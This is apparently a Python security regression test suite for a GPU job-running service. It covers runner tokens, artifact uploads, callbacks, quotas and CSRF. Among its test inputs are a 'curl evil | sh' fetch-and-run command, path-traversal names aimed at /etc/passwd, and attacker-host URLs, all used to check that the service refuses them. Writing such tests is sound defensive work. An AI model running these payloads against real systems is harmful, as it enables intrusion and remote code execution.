"""OpenGrid Jobs security: runner tokens (derived, never stored, job-scoped, expiring, revocable, constant-time),
callback hardening (body caps, log truncation, seq replay), artifact names / sizes / sha256 / tenant scoping,
the launch-time bootstrap render (never leaks, never sends a placeholder, refuses foreign jobs), ephemeral SSH
keys (private half never kept), and that customers cannot inject a startup script themselves.

Scratch DB og_test_jobs_sec, fake Lambda API, TestClient. No network.
Run:  .venv/Scripts/python tests/test_jobs_security.py
"""

from __future__ import annotations

import hashlib
import sys
import traceback
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import test_jobs as T  # noqa: E402

T.DB = "og_test_jobs_sec"

import main  # noqa: E402
from fastapi import HTTPException  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from sqlalchemy import text  # noqa: E402

import normalize  # noqa: E402
from accounts import accounts as acc  # noqa: E402
from accounts import keys, ratelimit  # noqa: E402
from bench_fixtures import q, scalar  # noqa: E402
from config import settings  # noqa: E402
from jobs import artifacts as A  # noqa: E402
from jobs import orchestrator as O  # noqa: E402
from jobs import tokens  # noqa: E402
from routing import credentials  # noqa: E402

client = TestClient(main.app)
HDR = {"X-OpenGrid-Request": "1"}
ALL = ["data:read", "route:preview", "route:execute", "deployments:read", "deployments:write"]


def setup(**kw):
    sim = T.world(**kw)
    settings.app_password = None
    settings.environment = "development"
    settings.job_artifact_max_mb = 64
    keys.reset_cache()
    ratelimit.reset()
    acc.reset_cache()
    return sim


def key(scopes=ALL):
    aid = T.bf.fresh_account()
    k = keys.create_key(aid, "sec", scopes, rate_limit_per_minute=1000)
    return {"Authorization": f"Bearer {k['secret']}"}, aid


def running_job(h=None):
    h = h or key()[0]
    r = client.post("/v1/jobs", headers={**h, "Idempotency-Key": str(uuid.uuid4())}, json=T.body())
    assert r.status_code == 202, r.text
    jid = r.json()["data"]["job_id"]
    T.to_running(jid)
    return jid, h


def rh(jid, tok=None):
    return {"Authorization": tokens.header_value(jid, tok or T.token_for(jid))}


def ev(seq, typ="log", **data):
    return {"seq": seq, "type": typ, "data": data or {"line": "x"}}


# --------------------------------------------------------------------------

def test_token_derivation_and_storage():
    setup()
    jid, _ = running_job()
    rows = q("SELECT nonce, expires_at, revoked_at FROM job_tokens WHERE job_id = :j", j=jid)
    assert len(rows) == 1 and rows[0][2] is None
    nonce, exp = rows[0][0], rows[0][1]
    tok = T.token_for(jid)
    assert len(tok) == 64 and tok != nonce and nonce not in tok
    d = T.dep_row(jid)
    assert abs((exp - (d.terminate_deadline_at + timedelta(minutes=15))).total_seconds()) < 5, (exp, d.terminate_deadline_at)
    dump = T.db_text_dump()
    assert tok not in dump, "token stored"
    # the pepper is part of the derivation: another pepper -> another token
    settings.api_key_pepper = "another-pepper"
    try:
        assert tokens.derive(jid, nonce) != tok
    finally:
        settings.api_key_pepper = "test-pepper-jobs"


def test_token_scoping():
    setup()
    a, h = running_job()
    b, _ = running_job(h)
    ta, tb = T.token_for(a), T.token_for(b)
    # A's token on B's URL
    r = client.post(f"/v1/jobs/{b}/runner/events", headers=rh(a, ta), json={"events": [ev(1)]})
    assert r.status_code == 403 and r.json()["detail"]["code"] == "runner_token_wrong_job", r.text
    # B's id in the header with A's token
    r = client.post(f"/v1/jobs/{b}/runner/events", headers=rh(b, ta), json={"events": [ev(1)]})
    assert r.status_code == 401 and r.json()["detail"]["code"] == "runner_token_invalid", r.text
    # malformed / API-key-shaped / basic
    for hdr in (f"Bearer ogj_{b}", f"Bearer ogj_{b}.{tb[:-1]}", f"Bearer opg_{tb}", f"Bearer {tb}", "Basic Zm9vOmJhcg==",
                f"bearer ogj_{b}.{tb.upper()}"):
        r = client.post(f"/v1/jobs/{b}/runner/events", headers={"Authorization": hdr}, json={"events": [ev(1)]})
        assert r.status_code in (401, 403), (hdr, r.status_code)
    # unknown job: the same answer as a bad token (no job oracle)
    r = client.post("/v1/jobs/job-ffffffffffffffff/runner/events", headers=rh("job-ffffffffffffffff", tb),
                    json={"events": [ev(1)]})
    assert r.status_code == 401 and r.json()["detail"]["code"] == "runner_token_invalid", r.text
    assert scalar("SELECT count(*) FROM job_runner_events") == 0
    # the runner token is not an API key anywhere else
    for path in (f"/v1/jobs/{b}", "/v1/jobs", f"/v1/deployments/{T.job_row(b).deployment_id}", "/v1/me"):
        r = client.get(path, headers=rh(b, tb))
        assert r.status_code == 401, (path, r.status_code)
    # replay of A's events with A's token still works only for A, and duplicates are ignored
    r = client.post(f"/v1/jobs/{a}/runner/events", headers=rh(a, ta), json={"events": [ev(1), ev(1), ev(2)]})
    assert r.json()["accepted"] == 2 and r.json()["duplicates"] == 1, r.text


def test_token_expiry_and_revocation():
    setup()
    jid, _ = running_job()
    tok = T.token_for(jid)
    with normalize.SessionLocal.begin() as s:
        s.execute(text("UPDATE job_tokens SET expires_at = now() - interval '1 second' WHERE job_id = :j"), {"j": jid})
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=rh(jid, tok), json={"events": [ev(1)]})
    assert r.status_code == 401 and r.json()["detail"]["code"] == "runner_token_expired", r.text
    with normalize.SessionLocal.begin() as s:
        s.execute(text("UPDATE job_tokens SET expires_at = now() + interval '1 hour', revoked_at = now() "
                       "WHERE job_id = :j"), {"j": jid})
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=rh(jid, tok), json={"events": [ev(1)]})
    assert r.status_code == 401 and r.json()["detail"]["code"] == "runner_token_revoked", r.text
    # accepting a call never extends the expiry
    with normalize.SessionLocal.begin() as s:
        s.execute(text("UPDATE job_tokens SET revoked_at = NULL WHERE job_id = :j"), {"j": jid})
    before = scalar("SELECT expires_at FROM job_tokens WHERE job_id = :j", j=jid)
    client.post(f"/v1/jobs/{jid}/runner/events", headers=rh(jid, tok), json={"events": [ev(1)]})
    assert scalar("SELECT expires_at FROM job_tokens WHERE job_id = :j", j=jid) == before
    assert scalar("SELECT last_seq FROM job_tokens WHERE job_id = :j", j=jid) == 1


def test_finished_job_refuses_callbacks():
    setup()
    jid, h = running_job()
    tok = T.token_for(jid)
    O.cancel(jid, T.who(T.job_row(jid).account_id))
    T.drive_to_end(jid)
    assert T.job_row(jid).status == "reconciled"
    with normalize.SessionLocal.begin() as s:   # even with an un-revoked token row, a finished job takes nothing
        s.execute(text("UPDATE job_tokens SET revoked_at = NULL WHERE job_id = :j"), {"j": jid})
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=rh(jid, tok), json={"events": [ev(5)]})
    assert r.status_code == 409 and r.json()["detail"]["code"] == "job_finished", r.text


def test_callback_bounds():
    setup()
    jid, _ = running_job()
    h = rh(jid)
    big = b'{"events": [{"seq": 1, "type": "log", "data": {"line": "' + b"a" * (1024 * 1024 + 10) + b'"}}]}'
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers={**h, "Content-Type": "application/json"}, content=big)
    assert r.status_code == 413, r.status_code
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [ev(1, line="b" * 10000)]})
    assert r.status_code == 200
    line = q("SELECT line FROM job_logs WHERE job_id = :j", j=jid)[0][0]
    assert len(line) <= 4096 + 20 and line.endswith("[truncated]"), len(line)
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [ev(i) for i in range(2, 600)]})
    assert r.status_code == 422 and r.json()["detail"]["code"] == "too_many_events", r.text
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [
        {"seq": -1, "type": "log"}, {"seq": "7", "type": "log"}, {"seq": 8, "type": "shell"}, {"seq": 9, "type": "log",
                                                                                              "data": "x"}]})
    assert r.status_code == 200 and r.json()["accepted"] == 0 and len(r.json()["rejected"]) == 4, r.text
    r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [
        ev(20, "metric", epoch=1, train_loss=0.5, evil="<script>", huge=1e308)]})
    assert r.status_code == 200
    r = client.post(f"/v1/jobs/{jid}/runner/complete", headers=h, json={"outcome": "pwned"})
    assert r.status_code == 422 and r.json()["detail"]["code"] == "invalid_outcome"


def test_artifact_names_sizes_hashes():
    setup()
    jid, owner = running_job()
    h = rh(jid)
    data = b"weights"
    sha = hashlib.sha256(data).hexdigest()
    for name in ("..", ".hidden", "UPPER.pt", "a" * 65, "x..y", "-x", "a%2Fb", "%2E%2E%2Fetc%2Fpasswd", "con fig"):
        r = client.put(f"/v1/jobs/{jid}/runner/artifacts/{name}", headers={**h, "X-Content-SHA256": sha}, content=data)
        assert r.status_code in (404, 405, 422), (name, r.status_code, r.text)
    for path in (f"/v1/jobs/{jid}/runner/artifacts/../../etc/passwd", f"/v1/jobs/{jid}/runner/artifacts/a/b"):
        r = client.put(path, headers={**h, "X-Content-SHA256": sha}, content=data)
        assert r.status_code in (401, 404, 405, 422), (path, r.status_code)
    r = client.put(f"/v1/jobs/{jid}/runner/artifacts/model.pt", headers=h, content=data)
    assert r.status_code == 422 and r.json()["detail"]["code"] == "artifact_sha256_required", r.text
    r = client.put(f"/v1/jobs/{jid}/runner/artifacts/model.pt", headers={**h, "X-Content-SHA256": "0" * 64},
                   content=data)
    assert r.status_code == 422 and r.json()["detail"]["code"] == "artifact_sha256_mismatch", r.text
    settings.job_artifact_max_mb = 1
    try:
        blob = b"z" * (1024 * 1024 + 1)
        r = client.put(f"/v1/jobs/{jid}/runner/artifacts/big.bin", headers={
            **h, "X-Content-SHA256": hashlib.sha256(blob).hexdigest()}, content=blob)
        assert r.status_code == 413, r.status_code
    finally:
        settings.job_artifact_max_mb = 64
    assert scalar("SELECT count(*) FROM job_artifacts") == 0
    r = client.put(f"/v1/jobs/{jid}/runner/artifacts/model.pt", headers={**h, "X-Artifact-SHA256": sha}, content=data)
    assert r.status_code == 200, r.text
    other = b"different"
    r = client.put(f"/v1/jobs/{jid}/runner/artifacts/model.pt", headers={
        **h, "X-Content-SHA256": hashlib.sha256(other).hexdigest()}, content=other)
    assert r.status_code == 409 and r.json()["detail"]["code"] == "artifact_exists", "never silently overwritten"
    # tenant-scoped download
    stranger, _ = key()
    assert client.get(f"/v1/jobs/{jid}/artifacts/model.pt", headers=stranger).status_code == 404
    assert client.get(f"/v1/jobs/{jid}/artifacts/model.pt", headers=rh(jid)).status_code == 401, "not with the token"
    r = client.get(f"/v1/jobs/{jid}/artifacts/model.pt", headers=owner)
    assert r.status_code == 200 and r.content == data
    assert client.get(f"/v1/jobs/{jid}/artifacts/model.pt").status_code == 200, "operator"
    assert client.get(f"/v1/jobs/{jid}/artifacts/..%2Fmodel.pt", headers=owner).status_code in (404, 422)
    # storage unavailable -> 503 with the actionable code
    settings.job_artifact_store = "s3"
    settings.job_artifact_s3_bucket = None
    try:
        r = client.put(f"/v1/jobs/{jid}/runner/artifacts/env.json", headers={**h, "X-Content-SHA256": sha}, content=data)
        assert r.status_code == 503 and r.json()["detail"]["code"] == "artifact_storage_unavailable", r.text
    finally:
        settings.job_artifact_store = "postgres"


def test_customers_cannot_inject_startup_scripts():
    setup()
    h, _ = key()
    r = client.post("/v1/route", headers={**h, "Idempotency-Key": str(uuid.uuid4())}, json={
        "gpu": "h100-80gb-sxm5", "launch": {"ssh_public_key": T.PK, "startup_script": "opengrid-job:job-0000000000000001"}})
    assert r.status_code == 422, r.text
    r = client.post("/v1/route", headers={**h, "Idempotency-Key": str(uuid.uuid4())}, json={
        "gpu": "h100-80gb-sxm5", "launch": {"ssh_public_key": T.PK, "user_data": "curl evil | sh"}})
    assert r.status_code == 422, r.text
    for extra in ({"command": "x"}, {"docker_image": "evil"}, {"dataset_url": "http://evil"}):
        r = client.post("/v1/jobs/preview", headers=h, json={**T.body(), **extra})
        assert r.status_code == 422, (extra, r.text)
    r = client.post("/v1/jobs/preview", headers=h, json=T.body(dataset_ref="http://evil/ds.tar"))
    assert r.status_code == 422 and r.json()["detail"]["code"] == "dataset_not_allowed", r.text
    assert T.SIM.creates() == []


def test_render_refuses_foreign_or_finished_jobs():
    setup()
    w = T.who()
    code, out = O.submit(T.body(), w)
    jid = out["job_id"]
    d = T.dep_row(jid)
    from routing.adapters.base import LaunchSpec

    class Fake:   # the deployment row view render_startup reads
        def __init__(self, **kw):
            self.__dict__.update(kw)

    spec = LaunchSpec(ssh_public_key=T.PK, startup_script=f"opengrid-job:{jid}")
    base = dict(deployment_id=d.deployment_id, route_request_id=d.route_request_id, account_id=d.account_id,
                purpose="customer", effective_max_runtime_minutes=30, max_runtime_minutes=30)
    got, problem = O.render_startup(Fake(**{**base, "account_id": 99999}), spec)
    assert got is None and "another account" in problem, problem
    got, problem = O.render_startup(Fake(**{**base, "deployment_id": "dep-other"}), spec)
    assert got is None and "another deployment" in problem, problem
    got, problem = O.render_startup(Fake(**{**base, "purpose": "validation"}), spec)
    assert got is None, problem
    got, problem = O.render_startup(Fake(**base), LaunchSpec(ssh_public_key=T.PK, startup_script="opengrid-job:../x"))
    assert got is None and "malformed" in problem
    assert scalar("SELECT count(*) FROM job_tokens") == 0, "no token for a refused render"
    got, problem = O.render_startup(Fake(**base), spec)
    assert problem is None and got.startup_script.startswith("#!/bin/bash")
    assert spec.startup_script == f"opengrid-job:{jid}", "the stored launch spec keeps the placeholder"


def test_unrenderable_placeholder_never_reaches_the_provider():
    setup()
    w = T.who()
    code, out = O.submit(T.body(), w)
    jid = out["job_id"]
    settings.job_callback_base_url = "http://callback.evil.example"     # not https: refused
    try:
        code, res = T.approve(jid)
    except HTTPException as exc:
        res = exc.detail
    finally:
        settings.job_callback_base_url = "https://jobs.test.opengrid.example"
    assert T.SIM.creates() == [], "no provider call with a placeholder or an http callback"
    d = T.dep_row(jid)
    assert d.status == "pending_approval" and d.launch_token is None, d.status
    ev = q("SELECT evidence FROM deployment_events WHERE deployment_id = :d ORDER BY id DESC LIMIT 1", d=d.deployment_id)
    assert ev[0][0]["code"] == "job_bootstrap_unavailable", ev


def test_ephemeral_key_private_half_discarded():
    setup()
    jid, _ = running_job()
    j = T.job_row(jid)
    assert j.ssh_key_mode == "ephemeral"
    dump = T.db_text_dump()
    assert "PRIVATE KEY" not in dump and "BEGIN OPENSSH" not in dump
    # the key registered at the provider is the one whose fingerprint the job records
    sent = [b for (m, p, b) in T.SIM.log if p == "/api/v1/ssh-keys" and m == "POST"]
    assert sent, "the per-deployment key was registered"
    d = T.dep_row(jid)
    lr = d.launch or {}
    assert credentials.public_key_fingerprint(lr.get("ssh_public_key")) == j.ssh_key_fingerprint, lr.keys()
    out = O.get(jid, T.who(j.account_id))
    assert "nobody" in out["ssh"]["note"]


def test_real_metrics_require_a_gpu():
    setup()
    jid, _ = running_job()
    T.runner_events(jid, [{"seq": 1, "type": "phase", "data": {"phase": "cpu_selected", "device": "cpu"}},
                          {"seq": 2, "type": "metric", "data": {"epoch": 1, "train_loss": 0.3, "test_accuracy": 0.9,
                                                                "batch_device": "cpu"}}])
    checks = {c["key"]: c["status"] for c in O.get(jid, T.who(T.job_row(jid).account_id))["checks"]}
    assert checks["cuda_available"] == "fail" and checks["real_metrics"] == "fail", checks


def test_operator_basic_auth_cannot_csrf_jobs():
    setup()
    settings.app_password = "pw"
    try:
        import base64
        b = {"Authorization": "Basic " + base64.b64encode(b"opengrid:pw").decode()}
        r = client.post("/v1/jobs", headers={**b, "Idempotency-Key": "k", "Origin": "https://evil.example"},
                        json=T.body())
        assert r.status_code == 403, r.text
        r = client.post("/v1/jobs", headers={**b, "Idempotency-Key": "k2", "Content-Type": "text/plain"},
                        content="{}")
        assert r.status_code == 403, r.text
    finally:
        settings.app_password = None
    assert scalar("SELECT count(*) FROM jobs") == 0


# -------------------------------------------------------------------------- adversarial review regressions

def test_allowlists_reject_trailing_newline():
    """Python's `$` matches before a trailing newline: every allowlist must be a FULL match (an artifact named
    'model.pt\\n' would otherwise be stored, break Content-Disposition and dodge the required-artifact check)."""
    setup()
    jid, owner = running_job()
    h = rh(jid)
    data = b"weights"
    sha = hashlib.sha256(data).hexdigest()
    r = client.put(f"/v1/jobs/{jid}/runner/artifacts/model.pt%0A", headers={**h, "X-Content-SHA256": sha}, content=data)
    assert r.status_code in (404, 422), (r.status_code, r.text)
    assert scalar("SELECT count(*) FROM job_artifacts WHERE job_id = :j", j=jid) == 0
    assert client.get(f"/v1/jobs/{jid}/artifacts/model.pt%0A", headers=owner).status_code in (404, 422)
    for bad in ("model.pt\n", "a\n"):
        try:
            A.check_name(bad)
            raise AssertionError(f"check_name accepted {bad!r}")
        except A.ArtifactError:
            pass
    assert client.get(f"/v1/jobs/{jid}%0A", headers=owner).status_code == 404
    r = client.post("/v1/jobs/preview", headers=owner, json=T.body(name="evil-name\n"))
    assert r.status_code == 422 and r.json()["detail"]["code"] == "invalid_name", r.text
    from runner import bootstrap
    good = dict(token="a" * 64, base_url="https://jobs.example", template="pytorch-mnist",
                config={"epochs": 1}, max_runtime_minutes=30)
    for k, v in (("job_id", "job-0123456789abcdef\n"), ("token", "a" * 64 + "\n"),
                 ("base_url", "https://jobs.example\n")):
        args = {"job_id": "job-0123456789abcdef", **good, k: v}
        try:
            bootstrap.render(args.pop("job_id"), args.pop("token"), **args)
            raise AssertionError(f"bootstrap accepted a trailing newline in {k}")
        except ValueError:
            pass
    assert not tokens.JOB_ID_RE.match("job-0123456789abcdef\n")


def test_per_job_runner_quotas():
    """A runner (anyone holding the token, e.g. a customer with SSH on their own instance) cannot grow the
    database without bound: per-job caps on ledger events, log lines and metric rows; phase / result / error
    events keep working past the soft cap so the job can still finish truthfully."""
    from jobs import sync
    setup()
    jid, _ = running_job()
    h = rh(jid)
    saved = (sync.MAX_EVENTS_PER_JOB, sync.MAX_LOG_LINES_PER_JOB, sync.MAX_METRICS_PER_JOB)
    sync.MAX_EVENTS_PER_JOB, sync.MAX_LOG_LINES_PER_JOB, sync.MAX_METRICS_PER_JOB = 20, 30, 10
    try:
        # amplification: one small event with 200 (empty) lines; three of them
        r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [
            {"seq": i, "type": "log", "data": {"lines": [""] * 200}} for i in (1, 2, 3)]})
        assert r.status_code == 200, r.text
        assert scalar("SELECT count(*) FROM job_logs WHERE job_id = :j", j=jid) <= 31, "log lines capped per job"
        r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [
            {"seq": 10 + i, "type": "metric", "data": {"step": i, "metrics": {f"m{k}": 1.0 for k in range(5)}}}
            for i in range(10)]})
        assert r.status_code == 200, r.text
        assert scalar("SELECT count(*) FROM job_metrics WHERE job_id = :j", j=jid) <= 10, "metric rows capped per job"
        r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [ev(100 + i) for i in range(40)]})
        assert r.status_code == 200, r.text
        n = scalar("SELECT count(*) FROM job_runner_events WHERE job_id = :j", j=jid)
        assert n <= 20, f"ledger capped per job ({n})"
        assert any("quota" in x["reason"] for x in r.json()["rejected"]), r.json()
        # essential events still accepted past the soft cap
        r = client.post(f"/v1/jobs/{jid}/runner/events", headers=h, json={"events": [
            {"seq": 500, "type": "phase", "data": {"phase": "training_started"}}]})
        assert r.status_code == 200 and r.json()["accepted"] == 1, r.text
    finally:
        sync.MAX_EVENTS_PER_JOB, sync.MAX_LOG_LINES_PER_JOB, sync.MAX_METRICS_PER_JOB = saved


def test_artifact_bytes_capped_per_job():
    """At most MAX_ARTIFACT_BYTES_FACTOR x job_artifact_max_mb stored per job (32 x 64 MB = 2 GB before)."""
    setup()
    jid, _ = running_job()
    h = rh(jid)
    settings.job_artifact_max_mb = 1
    try:
        blob = b"q" * (1024 * 1024 - 10)
        codes = []
        for i in range(A.MAX_ARTIFACT_BYTES_FACTOR + 2):
            b = blob[:-1] + bytes([i])
            r = client.put(f"/v1/jobs/{jid}/runner/artifacts/part{i}.bin",
                           headers={**h, "X-Content-SHA256": hashlib.sha256(b).hexdigest()}, content=b)
            codes.append(r.status_code)
        assert codes[:A.MAX_ARTIFACT_BYTES_FACTOR] == [200] * A.MAX_ARTIFACT_BYTES_FACTOR, codes
        assert codes[-1] == 413, codes
        total = scalar("SELECT coalesce(sum(size), 0) FROM job_artifacts WHERE job_id = :j", j=jid)
        assert total <= A.MAX_ARTIFACT_BYTES_FACTOR * 1024 * 1024, total
    finally:
        settings.job_artifact_max_mb = 64


def test_checkpoints_cannot_blow_the_quota():
    """Retention keeps a job's checkpoints at job_checkpoint_keep, inside the (unchanged) per-job byte quota."""
    setup()
    jid, _ = running_job()
    h = rh(jid)
    settings.job_artifact_max_mb, settings.job_checkpoint_max_mb, settings.job_checkpoint_keep = 1, 1, 2
    try:
        blob = b"c" * (1024 * 1024 - 10)
        for e in range(1, 13):
            b = blob[:-1] + bytes([e])
            r = client.put(f"/v1/jobs/{jid}/runner/artifacts/{A.checkpoint_name(e)}",
                           headers={**h, "X-Content-SHA256": hashlib.sha256(b).hexdigest()}, content=b)
            assert r.status_code == 200, (e, r.text)
        names = [n for (n,) in q("SELECT name FROM job_artifacts WHERE job_id = :j ORDER BY name", j=jid)]
        assert names == ["ckpt-e0011.pt", "ckpt-e0012.pt"], names
        total = scalar("SELECT coalesce(sum(size), 0) FROM job_artifacts WHERE job_id = :j", j=jid)
        assert total <= 2 * 1024 * 1024
        # results still fit; and a checkpoint can never be uploaded under a result's name or vice versa
        for n in ("model.pt", "config.json"):
            r = client.put(f"/v1/jobs/{jid}/runner/artifacts/{n}", headers={**h, "X-Content-SHA256": hashlib.sha256(
                n.encode()).hexdigest()}, content=n.encode())
            assert r.status_code == 200, r.text
        assert {a["kind"] for a in A.store().list(jid) if a["name"] in ("model.pt", "config.json")} == {"output"}
    finally:
        settings.job_artifact_max_mb, settings.job_checkpoint_max_mb, settings.job_checkpoint_keep = 64, 32, 2


def test_resume_download_scoping():
    """GET runner/resume: only the resuming job's own (unrevoked) token, only its pinned checkpoint."""
    setup()
    a, h = running_job()
    c = b"pinned-state" * 50
    r = client.put(f"/v1/jobs/{a}/runner/artifacts/ckpt-e0001.pt",
                   headers={**rh(a), "X-Content-SHA256": hashlib.sha256(c).hexdigest()}, content=c)
    assert r.status_code == 200, r.text
    r = client.post("/v1/jobs", headers={**h, "Idempotency-Key": str(uuid.uuid4())},
                    json=T.body(resume_from={"job_id": a}))
    assert r.status_code == 202, r.text
    b = r.json()["data"]["job_id"]
    T.to_running(b)
    tb = T.token_for(b)
    assert client.get(f"/v1/jobs/{b}/runner/resume", headers=rh(b, tb)).content == c
    # the runner token is not a read credential for the source job's public artifact routes
    for path in (f"/v1/jobs/{a}/artifacts", f"/v1/jobs/{a}/artifacts/ckpt-e0001.pt"):
        assert client.get(path, headers=rh(b, tb)).status_code == 401, path
    # a job created without resume_from gets nothing (resume_from is only set, and checked, at submission)
    assert client.get(f"/v1/jobs/{a}/runner/resume", headers=rh(a)).status_code == 404
    # a finished job's token is revoked: no more downloads
    T.sync.complete(b, {"outcome": "failed", "summary": {"reason": "training_failed"}})
    T.drive_to_end(b)
    r = client.get(f"/v1/jobs/{b}/runner/resume", headers=rh(b, tb))
    assert r.status_code in (401, 409) and r.json()["detail"]["code"] in ("runner_token_revoked", "job_finished"), r.text
    # and once nobody is pinned to it, retention may prune the checkpoint normally
    settings.job_checkpoint_keep = 1
    try:
        for e in (2, 3):
            d = b"later-%d" % e
            assert A.store().put(a, A.checkpoint_name(e), d, hashlib.sha256(d).hexdigest()).get("kind") == "checkpoint"
        assert [x["epoch"] for x in A.checkpoints(a)] == [3]
    finally:
        settings.job_checkpoint_keep = 2


TESTS = [test_token_derivation_and_storage, test_token_scoping, test_token_expiry_and_revocation,
         test_finished_job_refuses_callbacks, test_callback_bounds, test_artifact_names_sizes_hashes,
         test_customers_cannot_inject_startup_scripts, test_render_refuses_foreign_or_finished_jobs,
         test_unrenderable_placeholder_never_reaches_the_provider, test_ephemeral_key_private_half_discarded,
         test_real_metrics_require_a_gpu, test_operator_basic_auth_cannot_csrf_jobs,
         test_allowlists_reject_trailing_newline, test_per_job_runner_quotas, test_artifact_bytes_capped_per_job,
         test_checkpoints_cannot_blow_the_quota, test_resume_download_scoping]


def main_(only=None) -> int:
    failed = 0
    try:
        for t in TESTS:
            if only and t.__name__ not in only:
                continue
            try:
                t()
                print(f"PASS {t.__name__}")
            except Exception:  # noqa: BLE001
                failed += 1
                print(f"FAIL {t.__name__}")
                traceback.print_exc()
    finally:
        if T.S_ is not None:
            T.bf.drop(T.S_, T.DB)
    print(f"{len(TESTS) - failed if not only else '-'} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main_(sys.argv[1:] or None))
